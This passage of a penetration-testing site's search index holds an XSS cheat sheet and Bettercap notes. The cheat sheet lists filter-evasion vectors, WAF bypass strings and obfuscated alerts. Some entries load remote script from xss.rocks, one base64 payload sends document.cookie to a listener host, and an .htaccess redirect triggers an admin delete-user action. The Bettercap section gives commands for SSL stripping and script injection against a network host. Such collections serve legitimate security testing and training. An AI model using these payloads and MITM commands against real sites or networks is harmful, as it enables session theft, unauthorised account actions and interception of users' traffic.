"penetration-testing/cheatsheets/xss-cheatsheet/#using-actionscript-inside-flash-for-obfuscation", "title": "Using ActionScript Inside Flash for Obfuscation", "text": "<pre><code>a = 'get';\nb = 'URL(\"';\nc = 'javascript:';\nd = \"alert('XSS');\\\")\";\neval(a + b + c + d);\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xml-data-island-with-cdata-obfuscation", "title": "XML Data Island with CDATA Obfuscation", "text": "<p>This XSS attack works only in IE and Netscape 8.1 in IE rendering engine mode) - vector found by Sec Consult while auditing Yahoo:</p> <pre><code>&lt;XML ID=\"xss\"&gt;&lt;I&gt;&lt;B&gt;&lt;IMG SRC=\"javas&lt;!-- --&gt;cript:alert('XSS')\"&gt;&lt;/B&gt;&lt;/I&gt;&lt;/XML&gt;\n&lt;SPAN DATASRC=\"#xss\" DATAFLD=\"B\" DATAFORMATAS=\"HTML\"&gt;&lt;/SPAN&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#locally-hosted-xml-with-embedded-javascript-that-is-generated-using-an-xml-data-island", "title": "Locally hosted XML with embedded JavaScript that is generated using an XML data island", "text": "<p>This is the same as above but instead referrs to a locally hosted (must be on the same server) XML file that contains your cross site scripting vector. You can see the result here:</p> <pre><code>&lt;XML SRC=\"xsstest.xml\" ID=I&gt;&lt;/XML&gt;\n&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#htmltime-in-xml", "title": "HTML+TIME in XML", "text": "<p>This is how Grey Magic hacked Hotmail and Yahoo!. This only works in Internet Explorer and Netscape 8.1 in IE rendering engine mode and remember that you need to be between HTML and BODY tags for this to work:</p> <pre><code>&lt;html&gt;\n  &lt;body&gt;\n    &lt;?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"&gt;\n    &lt;?import namespace=\"t\" implementation=\"#default#time2\"&gt;\n    &lt;t:set attributeName=\"innerHTML\" to=\"XSS\n    &lt;script defer&gt;\n      alert('XSS');\n    &lt;/script&gt;\n    \"&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#assuming-you-can-only-fit-in-a-few-characters-and-it-filters-against-js", "title": "Assuming you can only fit in a few characters and it filters against <code>.js</code>", "text": "<p>You can rename your JavaScript file to an image as an XSS vector:</p> <pre><code>&lt;script src=\"http://xss.rocks/xss.jpg\"&gt;&lt;/script&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#ssi-server-side-includes", "title": "SSI (Server Side Includes)", "text": "<p>This requires SSI to be installed on the server to use this XSS vector. I probably don't need to mention this, but if you can run commands on the server there are no doubt much more serious issues:</p> <pre><code>&lt;!--#exec cmd=\"/bin/echo '&lt;SCR'\"--&gt;&lt;!--#exec cmd=\"/bin/echo 'IPT SRC=http://xss.rocks/xss.js&gt;&lt;/SCRIPT&gt;'\"--&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#php", "title": "PHP", "text": "<p>Requires PHP to be installed on the server to use this XSS vector. Again, if you can run any scripts remotely like this, there are probably much more dire issues:</p> <pre><code>&lt;? echo('&lt;SCR)';\necho('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-embedded-commands", "title": "IMG Embedded Commands", "text": "<p>This works when the webpage where this is injected (like a web-board) is behind password protection and that password protection works with other commands on the same domain. This can be used to delete users, add users (if the user who visits the page is an administrator), send credentials elsewhere, etc.... This is one of the lesser used but more useful XSS vectors:</p> <pre><code>&lt;img src=\"http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#img-embedded-commands-part-ii", "title": "IMG Embedded Commands part II", "text": "<p>This is more scary because there are absolutely no identifiers that make it look suspicious other than it is not hosted on your own domain. The vector uses a 302 or 304 (others work too) to redirect the image back to a command. So a normal <code>&lt;IMG SRC=\"httx://badguy.com/a.jpg\"&gt;</code> could actually be an attack vector to run commands as the user who views the image link. Here is the .htaccess (under Apache) line to accomplish the vector (thanks to Timo for part of this):</p> <p><code>Redirect 302 /a.jpg http://victimsite.com/admin.asp&amp;deleteuser</code></p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#cookie-manipulation", "title": "Cookie Manipulation", "text": "<p>Admittedly this is pretty obscure but I have seen a few examples where <code>&lt;META</code> is allowed and you can use it to overwrite cookies. There are other examples of sites where instead of fetching the username from a database it is stored inside of a cookie to be displayed only to the user who visits the page. With these two scenarios combined you can modify the victim's cookie which will be displayed back to them as JavaScript (you can also use this to log people out or change their user states, get them to log in as you, etc...):</p> <pre><code>&lt;meta http-equiv=\"Set-Cookie\" content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#utf-7-encoding", "title": "UTF-7 Encoding", "text": "<p>If the page that the XSS resides on doesn't provide a page charset header, or any browser that is set to UTF-7 encoding can be exploited with the following (Thanks to Roman Ivanov for this one). Click here for an example (you don't need the charset statement if the user's browser is set to auto-detect and there is no overriding content-types on the page in Internet Explorer and Netscape 8.1 in IE rendering engine mode). This does not work in any modern browser without changing the encoding type which is why it is marked as completely unsupported. Watchfire found this hole in Google's custom 404 script.:</p> <pre><code>&lt;head&gt;\n  &lt;meta http-equiv=\"CONTENT-TYPE\" content=\"text/html; charset=UTF-7\" /&gt;&lt;/head\n&gt;+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-`\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xss-using-html-quote-encapsulation", "title": "XSS Using HTML Quote Encapsulation", "text": "<p>This was tested in IE, your mileage may vary. For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>&lt;SCRIPT SRC...</code> by way of a regex filter <code>/\\&lt;script\\[^\\&gt;\\]+src/i</code>:</p> <pre><code>&lt;script a=\"&gt;\" src=\"httx://xss.rocks/xss.js\"&gt;&lt;/script&gt;\n</code></pre> <p>For performing XSS on sites that allow <code>&lt;SCRIPT&gt;</code> but don't allow <code>\\&lt;script src...</code> by way of a regex filter <code>/\\&lt;script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\&gt;\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i</code> (this is an important one, because I've seen this regex in the wild):</p> <pre><code>&lt;script =\"&gt;\" src=\"httx://xss.rocks/xss.js\"&gt;&lt;/script&gt;\n</code></pre> <p>Another XSS to evade the same filter, <code>/\\&lt;script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\&gt;\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i</code>:</p> <pre><code>&lt;SCRIPT a=\"&gt;\" '' SRC=\"httx://xss.rocks/xss.js\"&gt;&lt;/SCRIPT&gt;\n</code></pre> <p>Yet another XSS to evade the same filter, <code>/\\&lt;script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\&gt;\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i</code>. I know I said I wasn't goint to discuss mitigation techniques but the only thing I've seen work for this XSS example if you still want to allow <code>&lt;SCRIPT&gt;</code> tags but not remote script is a state machine (and of course there are other ways to get around this if they allow <code>&lt;SCRIPT&gt;</code> tags):</p> <pre><code>&lt;SCRIPT \"a='&gt;'\" SRC=\"httx://xss.rocks/xss.js\"&gt;&lt;/SCRIPT&gt;\n</code></pre> <p>And one last XSS attack to evade, <code>/\\&lt;script((\\\\s+\\\\w+(\\\\s\\*=\\\\s\\*(?:\"(.)\\*?\"|'(.)\\*?'|\\[^'\"\\&gt;\\\\s\\]+))?)+\\\\s\\*|\\\\s\\*)src/i</code> using grave accents (again, doesn't work in Firefox):</p> <pre><code>&lt;script a=\"`\"&gt;\n  ` SRC=\"httx://xss.rocks/xss.js\"&gt;\n&lt;/script&gt;\n</code></pre> <p>Here's an XSS example that bets on the fact that the regex won't catch a matching pair of quotes but will rather find any quotes to terminate a parameter string improperly:</p> <pre><code>&lt;script a=\"&gt;'&gt;\" src=\"httx://xss.rocks/xss.js\"&gt;&lt;/script&gt;\n</code></pre> <p>This XSS still worries me, as it would be nearly impossible to stop this without blocking all active content:</p> <pre><code>&lt;SCRIPT&gt;document.write(\"&lt;SCRI\");&lt;/SCRIPT&gt;PT SRC=\"httx://xss.rocks/xss.js\"&gt;&lt;/SCRIPT&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#url-string-evasion", "title": "URL String Evasion", "text": "<p>Assuming <code>http://www.google.com/</code> is programmatically disallowed:</p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#ip-versus-hostname", "title": "IP Versus Hostname", "text": "<pre><code>&lt;a href=\"http://66.102.7.147/\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#url-encoding", "title": "URL Encoding", "text": "<pre><code>&lt;a href=\"http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#dword-encoding", "title": "DWORD Encoding", "text": "<p>Note: there are other of variations of Dword encoding - see the IP Obfuscation calculator below for more details:</p> <pre><code>&lt;a href=\"http://1113982867/\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#hex-encoding", "title": "Hex Encoding", "text": "<p>The total size of each number allowed is somewhere in the neighborhood of 240 total characters as you can see on the second digit, and since the hex number is between 0 and F the leading zero on the third hex quotet is not required):</p> <pre><code>&lt;a href=\"http://0x42.0x0000066.0x7.0x93/\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#octal-encoding", "title": "Octal Encoding", "text": "<p>Again padding is allowed, although you must keep it above 4 total characters per class - as in class A, class B, etc...:</p> <pre><code>&lt;a href=\"http://0102.0146.0007.00000223/\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#base64-encoding", "title": "Base64 Encoding", "text": "<pre><code>&lt;img onload=\"eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))\" /&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#mixed-encoding", "title": "Mixed Encoding", "text": "<p>Let's mix and match base encoding and throw in some tabs and newlines - why browsers allow this, I'll never know). The tabs and newlines only work if this is encapsulated with quotes:</p> <pre><code>&lt;a\n  href=\"h \ntt  p://6 6.000146.0x7.147/\"\n  &gt;XSS&lt;/a\n&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#protocol-resolution-bypass", "title": "Protocol Resolution Bypass", "text": "<p><code>//</code> translates to <code>http://</code> which saves a few more bytes. This is really handy when space is an issue too (two less characters can go a long way) and can easily bypass regex like <code>(ht|f)tp(s)?://</code> (thanks to Ozh for part of this one). You can also change the <code>//</code> to <code>\\\\\\\\</code>. You do need to keep the slashes in place, however, otherwise this will be interpreted as a relative path URL.</p> <pre><code>&lt;a href=\"//www.google.com/\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#google-feeling-lucky-part-1", "title": "Google \"feeling lucky\" part 1", "text": "<p>Firefox uses Google's \"feeling lucky\" function to redirect the user to any keywords you type in. So if your exploitable page is the top for some random keyword (as you see here) you can use that feature against any Firefox user. This uses Firefox's <code>keyword:</code> protocol. You can concatenate several keywords by using something like the following <code>keyword:XSS+RSnake</code> for instance. This no longer works within Firefox as of 2.0.</p> <pre><code>&lt;a href=\"//google\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#google-feeling-lucky-part-2", "title": "Google \"feeling lucky\" part 2", "text": "<p>This uses a very tiny trick that appears to work Firefox only, because of it's implementation of the \"feeling lucky\" function. Unlike the next one this does not work in Opera because Opera believes that this is the old HTTP Basic Auth phishing attack, which it is not. It's simply a malformed URL. If you click okay on the dialogue it will work, but as a result of the erroneous dialogue box I am saying that this is not supported in Opera, and it is no longer supported in Firefox as of 2.0:</p> <pre><code>&lt;a href=\"http://ha.ckers.org@google\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#google-feeling-lucky-part-3", "title": "Google \"feeling lucky\" part 3", "text": "<p>This uses a malformed URL that appears to work in Firefox and Opera only, because if their implementation of the \"feeling lucky\" function. Like all of the above it requires that you are #1 in Google for the keyword in question (in this case \"google\"):</p> <pre><code>&lt;a href=\"http://google:ha.ckers.org\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#removing-cnames", "title": "Removing CNAMEs", "text": "<p>When combined with the above URL, removing <code>www.</code> will save an additional 4 bytes for a total byte savings of 9 for servers that have this set up properly):</p> <pre><code>&lt;a href=\"http://google.com/\"&gt;XSS&lt;/a&gt;\n</code></pre> <p>Extra dot for absolute DNS:</p> <pre><code>&lt;a href=\"http://www.google.com./\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#javascript-link-location", "title": "JavaScript Link Location", "text": "<pre><code>&lt;a href=\"javascript:document.location='http://www.google.com/'\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#content-replace-as-attack-vector", "title": "Content Replace as Attack Vector", "text": "<p>Assuming <code>http://www.google.com/</code> is programmatically replaced with nothing). I actually used a similar attack vector against a several separate real world XSS filters by using the conversion filter itself (here is an example) to help create the attack vector (IE: <code>java&amp;\\#x09;script:</code> was converted into <code>java script:</code>, which renders in IE, Netscape 8.1+ in secure site mode and Opera):</p> <pre><code>&lt;a href=\"http://www.google.com/ogle.com/\"&gt;XSS&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#assisting-xss-with-http-parameter-pollution", "title": "Assisting XSS with HTTP Parameter Pollution", "text": "<p>Assume a content sharing flow on a web site is implemented as below. There is a \"Content\" page which includes some content provided by users and this page also includes a link to \"Share\" page which enables a user choose their favorite social sharing platform to share it on. Developers HTML encoded the \"title\" parameter in the \"Content\" page to prevent against XSS but for some reasons they didn't URL encoded this parameter to prevent from HTTP Parameter Pollution. Finally they decide that since content_type's value is a constant and will always be integer, they didn't encode or validate the content_type in the \"Share\" page.</p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#content-page-source-code", "title": "Content Page Source Code", "text": "<pre><code>`a href=\"/Share?content_type=1&amp;title=&lt;%=Encode.forHtmlAttribute(untrusted content title)%&gt;\"&gt;Share&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#share-page-source-code", "title": "Share Page Source Code", "text": "<pre><code>&lt;script&gt;\n  var contentType = &lt;%=Request.getParameter(\"content_type\")%&gt;;\n  var title = \"&lt;%=Encode.forJavaScript(request.getParameter(\"title\"))%&gt;\";\n  ...\n  //some user agreement and sending to server logic might be here\n  ...\n&lt;/script&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#content-page-output", "title": "Content Page Output", "text": "<p>In this case if attacker set untrusted content title as \u201cThis is a regular title&amp;content_type=1;alert(1)\u201d the link in \"Content\" page would be this:</p> <pre><code>&lt;a href=\"/share?content_type=1&amp;title=This is a regular title&amp;amp;content_type=1;alert(1)\"&gt;Share&lt;/a&gt;\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#share-page-output", "title": "Share Page Output", "text": "<p>And in share page output could be this:</p> <pre><code>&lt;script&gt;\n  var contentType = 1; alert(1);\n  var title = \"This is a regular title\";\n  \u2026\n  //some user agreement and sending to server logic might be here\n  \u2026\n&lt;/script&gt;\n</code></pre> <p>As a result, in this example the main flaw is trusting the content_type in the \"Share\" page without proper encoding or validation. HTTP Parameter Pollution could increase impact of the XSS flaw by promoting it from a reflected XSS to a stored XSS.</p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#character-escape-sequences", "title": "Character Escape Sequences", "text": "<p>All the possible combinations of the character \"\\&lt;\" in HTML and JavaScript. Most of these won't render out of the box, but many of them can get rendered in certain circumstances as seen above.</p> <ul> <li><code>&lt;</code></li> <li><code>%3C</code></li> <li><code>&amp;lt</code></li> <li><code>&amp;lt;</code></li> <li><code>&amp;LT</code></li> <li><code>&amp;LT;</code></li> <li><code>&amp;#60;</code></li> <li><code>&amp;#060;</code></li> <li><code>&amp;#0060;</code></li> <li><code>&amp;#00060;</code></li> <li><code>&amp;#000060;</code></li> <li><code>&amp;#0000060;</code></li> <li><code>&amp;#60;</code></li> <li><code>&amp;#060;</code></li> <li><code>&amp;#0060;</code></li> <li><code>&amp;#00060;</code></li> <li><code>&amp;#000060;</code></li> <li><code>&amp;#0000060;</code></li> <li><code>&amp;#x3c;</code></li> <li><code>&amp;#x03c;</code></li> <li><code>&amp;#x003c;</code></li> <li><code>&amp;#x0003c;</code></li> <li><code>&amp;#x00003c;</code></li> <li><code>&amp;#x000003c;</code></li> <li><code>&amp;#x3c;</code></li> <li><code>&amp;#x03c;</code></li> <li><code>&amp;#x003c;</code></li> <li><code>&amp;#x0003c;</code></li> <li><code>&amp;#x00003c;</code></li> <li><code>&amp;#x000003c;</code></li> <li><code>&amp;#X3c;</code></li> <li><code>&amp;#X03c;</code></li> <li><code>&amp;#X003c;</code></li> <li><code>&amp;#X0003c;</code></li> <li><code>&amp;#X00003c;</code></li> <li><code>&amp;#X000003c;</code></li> <li><code>&amp;#X3c;</code></li> <li><code>&amp;#X03c;</code></li> <li><code>&amp;#X003c;</code></li> <li><code>&amp;#X0003c;</code></li> <li><code>&amp;#X00003c;</code></li> <li><code>&amp;#X000003c;</code></li> <li><code>&amp;#x3C;</code></li> <li><code>&amp;#x03C;</code></li> <li><code>&amp;#x003C;</code></li> <li><code>&amp;#x0003C;</code></li> <li><code>&amp;#x00003C;</code></li> <li><code>&amp;#x000003C;</code></li> <li><code>&amp;#x3C;</code></li> <li><code>&amp;#x03C;</code></li> <li><code>&amp;#x003C;</code></li> <li><code>&amp;#x0003C;</code></li> <li><code>&amp;#x00003C;</code></li> <li><code>&amp;#x000003C;</code></li> <li><code>&amp;#X3C;</code></li> <li><code>&amp;#X03C;</code></li> <li><code>&amp;#X003C;</code></li> <li><code>&amp;#X0003C;</code></li> <li><code>&amp;#X00003C;</code></li> <li><code>&amp;#X000003C;</code></li> <li><code>&amp;#X3C;</code></li> <li><code>&amp;#X03C;</code></li> <li><code>&amp;#X003C;</code></li> <li><code>&amp;#X0003C;</code></li> <li><code>&amp;#X00003C;</code></li> <li><code>&amp;#X000003C;</code></li> <li><code>\\x3c</code></li> <li><code>\\x3C</code></li> <li><code>\\u003c</code></li> <li><code>\\u003C</code></li> </ul>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#methods-to-bypass-waf-cross-site-scripting", "title": "Methods to Bypass WAF \u2013 Cross-Site Scripting", "text": "", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#stored-xss", "title": "Stored XSS", "text": "<p>If an attacker managed to push XSS through the filter, WAF wouldn\u2019t be able to prevent the attack conduction.</p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#reflected-xss-in-javascript", "title": "Reflected XSS in Javascript", "text": "<pre><code>Example: &lt;script&gt; ... setTimeout(\\\\\"writetitle()\\\\\",$\\_GET\\[xss\\]) ... &lt;/script&gt;\nExploitation: /?xss=500); alert(document.cookie);//\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#dom-based-xss", "title": "DOM-based XSS", "text": "<pre><code>Example: &lt;script&gt; ... eval($\\_GET\\[xss\\]); ... &lt;/script&gt;\nExploitation: /?xss=document.cookie\n</code></pre>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#xss-via-request-redirection", "title": "XSS via request Redirection", "text": "<ul> <li>Vulnerable code:</li> </ul> <pre><code>...\nheader('Location: '.$_GET['param']);\n...\n</code></pre> <p>As well as:</p> <pre><code>..\nheader('Refresh: 0; URL='.$_GET['param']);\n...\n</code></pre> <ul> <li>This request will not pass through the WAF:</li> </ul> <p><code>/?param=&lt;javascript:alert(document.cookie&gt;)</code></p> <ul> <li>This request will pass through the WAF and an XSS attack will be conducted in certain browsers.</li> </ul> <p><code>/?param=&lt;data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=</code></p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#waf-bypass-strings-for-xss", "title": "WAF ByPass Strings for XSS", "text": "<ul> <li><code>&lt;Img src = x onerror = \"javascript: window.onerror = alert; throw XSS\"&gt;</code></li> <li><code>&lt;Video&gt; &lt;source onerror = \"javascript: alert (XSS)\"&gt;</code></li> <li><code>&lt;Input value = \"XSS\" type = text&gt;</code></li> <li><code>&lt;applet code=\"javascript:confirm(document.cookie);\"&gt;</code></li> <li><code>&lt;isindex x=\"javascript:\" onmouseover=\"alert(XSS)\"&gt;</code></li> <li><code>\"&gt;&lt;/SCRIPT&gt;\u201d&gt;\u2019&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(88,83,83))&lt;/SCRIPT&gt;</code></li> <li><code>\"&gt;&lt;img src=\"x:x\" onerror=\"alert(XSS)\"&gt;</code></li> <li><code>\"&gt;&lt;iframe src=\"javascript:alert(XSS)\"&gt;</code></li> <li><code>&lt;object data=\"javascript:alert(XSS)\"&gt;</code></li> <li><code>&lt;isindex type=image src=1 onerror=alert(XSS)&gt;</code></li> <li><code>&lt;img src=x:alert(alt) onerror=eval(src) alt=0&gt;</code></li> <li><code>&lt;img src=\"x:gif\" onerror=\"window['al\\u0065rt'](0)\"&gt;&lt;/img&gt;</code></li> <li><code>&lt;iframe/src=\"data:text/html,&lt;svg onload=alert(1)&gt;\"&gt;</code></li> <li><code>&lt;meta content=\"&amp;NewLine; 1 &amp;NewLine;; JAVASCRIPT&amp;colon; alert(1)\" http-equiv=\"refresh\"/&gt;</code></li> <li><code>&lt;svg&gt;&lt;script xlink:href=data&amp;colon;,window.open('https://www.google.com/')&gt;&lt;/script</code></li> <li><code>&lt;meta http-equiv=\"refresh\" content=\"0;url=javascript:confirm(1)\"&gt;</code></li> <li><code>&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;&gt;</code></li> <li><code>&lt;form&gt;&lt;a href=\"javascript:\\u0061lert(1)\"&gt;X</code></li> <li><code>&lt;/script&gt;&lt;img/*%00/src=\"worksinchrome&amp;colon;prompt(1)\"/%00*/onerror='eval(src)'&gt;</code></li> <li><code>&lt;style&gt;//*{x:expression(alert(/xss/))}//&lt;style&gt;&lt;/style&gt;</code></li> <li>On Mouse Over\u200b</li> <li><code>&lt;img src=\"/\" =_=\" title=\"onerror='prompt(1)'\"&gt;</code></li> <li><code>&lt;a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&amp;#97v&amp;#97script:&amp;#97lert(1)&gt;ClickMe</code></li> <li><code>&lt;script x&gt; alert(1) &lt;/script 1=2</code></li> <li><code>&lt;form&gt;&lt;button formaction=javascript&amp;colon;alert(1)&gt;CLICKME</code></li> <li><code>&lt;input/onmouseover=\"javaSCRIPT&amp;colon;confirm&amp;lpar;1&amp;rpar;\"</code></li> <li><code>&lt;iframe src=\"data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E\"&gt;&lt;/iframe&gt;</code></li> <li><code>&lt;OBJECT CLASSID=\"clsid:333C7BC4-460F-11D0-BC04-0080C7055A83\"&gt;&lt;PARAM NAME=\"DataURL\" VALUE=\"javascript:alert(1)\"&gt;&lt;/OBJECT&gt;</code></li> </ul>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/cheatsheets/xss-cheatsheet/#filter-bypass-alert-obfuscation", "title": "Filter Bypass Alert Obfuscation", "text": "<ul> <li><code>(alert)(1)</code></li> <li><code>a=alert,a(1)</code></li> <li><code>[1].find(alert)</code></li> <li><code>top[\u201cal\u201d+\u201dert\u201d](1)</code></li> <li><code>top[/al/.source+/ert/.source](1)</code></li> <li><code>al\\u0065rt(1)</code></li> <li><code>top[\u2018al\\145rt\u2019](1)</code></li> <li><code>top[\u2018al\\x65rt\u2019](1)</code></li> <li><code>top[8680439..toString(30)](1)</code></li> <li><code>alert?.()</code></li> <li>`<code>${alert``}</code>` (The payload should include leading and trailing backticks.)</li> <li><code>(alert())</code></li> </ul> <p>source: OWASP / www-community</p>", "tags": ["penetration-testing", "tools", "cheatsheet"]}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/", "title": "Bettercap 1.6.2 Installation", "text": "", "tags": ["penetration-testing", "tools"]}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/#bettercap-162-installation", "title": "Bettercap 1.6.2 Installation", "text": "<p>BetterCAP is a powerful, flexible, and portable tool created to perform various types of MITM attacks against a network</p> <p>Bettercap 1.6.2 is legacy tool, but it performs ssl strip much better then Bettercap 2.x</p> <p>Install Ruby Gem</p> <pre><code>apt install -y ruby-full libpcap-dev\ngem update --system\ngem install bettercap\n</code></pre> <p>Bettercap 1.6.2 installs the executable to /usr/local/bin/bettercap</p> <p>Bettercap 2.x installs the executable to /usr/bin/bettercap</p> <p>Both Bettercap 1.6.2 and 2.x shares the same executable name. In order to privet any collisions we will rename the Bettercap 1.6.2 executable to <code>bettercap1.6.2</code>.</p> <pre><code>mv /usr/local/bin/bettercap /usr/local/bin/bettercap1.6.2\n</code></pre> <p>From this point you can run bettercap1.6.2 for <code>Bettercap 1.6.2</code> and bettercap for <code>Bettercap 2.x</code></p>", "tags": ["penetration-testing", "tools"]}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/#bettercap-162-ssl-strip-examples", "title": "Bettercap 1.6.2 SSL Strip Examples", "text": "<p>Basic SSL Strip Example</p> <pre><code>bettercap1.6.2 -X -T 192.168.1.104 --proxy\n</code></pre> <p>SSL Strip With XSS Example</p> <pre><code>bettercap1.6.2 -X -T 192.168.3.104 --proxy --proxy-module injectjs --js-data \"&lt;script&gt;alert('SSL STRIP, Script Injection')&lt;/script&gt;\"\n</code></pre>", "tags": ["penetration-testing", "tools"]}, {"location": "penetration-testing/kali-linux/bettercap1.6.2/#dbug", "title": "Dbug", "text": "<p>To find that Bettercap installation from ruby gems:</p> <pre><code>gem environment\n</code></pre> <p>the path should be under GEM PATHP for example:</p> <pre><code>/var/lib/gems/2.7.0/gems/bettercap-1.6.2\n</code></pre>", "tags": ["penetration-testing", "tools"]}, {"location": "penetration-testing/kali-linux/kali-linux/", "title": "Kali Linux", "text": "", "tags": ["penetration-testing", "kali-linux", "kali"]}, {"location": "penetration-testing/kali-linux/kali-linux/#minimal-headless-kali-linux-installation-works-for-cloud-vm-installation-no-gui", "title": "Minimal 